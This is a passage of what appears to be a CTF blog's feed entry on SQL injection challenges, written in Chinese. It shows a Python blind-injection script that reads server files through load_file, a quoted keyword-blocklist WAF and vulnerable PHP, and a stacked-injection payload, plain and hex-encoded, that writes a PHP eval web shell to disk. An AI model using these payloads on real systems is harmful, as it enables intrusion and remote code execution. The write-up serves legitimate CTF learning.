class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://9ba27d3d-01fd-4c6e-8c1c-e52d69a8a150.node3.buuoj.cn/user/user.php?id=&quot;&quot;&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;fg4kp97ksielnvnssv53iul2s6&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data=<span class="string">&#x27;0x&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        _url = url + <span class="string">&#x27;^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&lt;&#x27;</span>+data+str(hex(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        result=r.get(url=url,cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            data+=str(hex(i<span class="number">-1</span>)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            flag+=(chr(i<span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>发现包含了bwvs_config/config.php和waf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">$black_str = <span class="string">&quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">&quot;@@&quot;</span>,$str);</span><br><span class="line"><span class="keyword">return</span> addslashes($str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">$id=waf($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;</span>.$id;</span><br><span class="line">$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">$result = mysqli_store_result($connect);</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;user_id:&#x27;</span>.$row[<span class="number">0</span>].<span class="string">&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;</span>.$row[<span class="number">1</span>].<span class="string">&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间：&quot;</span>.$row[<span class="number">4</span>].<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>既然有mysqli_multi_query，就会存在堆叠注入，使用上面提到的MySQL预编译来绕过select的限制。</p><p>利用堆叠注入像头像上传的位置写入shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @xx&#x3D;0x53454c45435420273c3f70687020406576616c28245f504f53545b615d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e70687027;prepare x from @xx;execute x;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201015161424.png" alt=""></p><h2 id="PwnThyBytes2019-Baby-SQL">PwnThyBytes2019 Baby_SQL</h2><h2 id="October-2019-Twice-SQL-Injection">October 2019 Twice SQL Injection</h2><h2 id="HITCON-2017-SQL-So-Hard">HITCON 2017 SQL So Hard</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;强网杯-2019-随便注&quot;&gt;强网杯 2019 随便注&lt;/h2&gt;
&lt;h3 id=&quot;考点&quot;&gt;考点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;堆叠注入&lt;/li&gt;
&lt;li&gt;预编译语句&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;解题&quot;&gt;解题&lt;/h3&gt;
&lt;h4 id=&quot;方法一&quot;&gt;方法一&lt;/h4
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="SQL注入" scheme="http://ca0y1h.top/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
</feed>
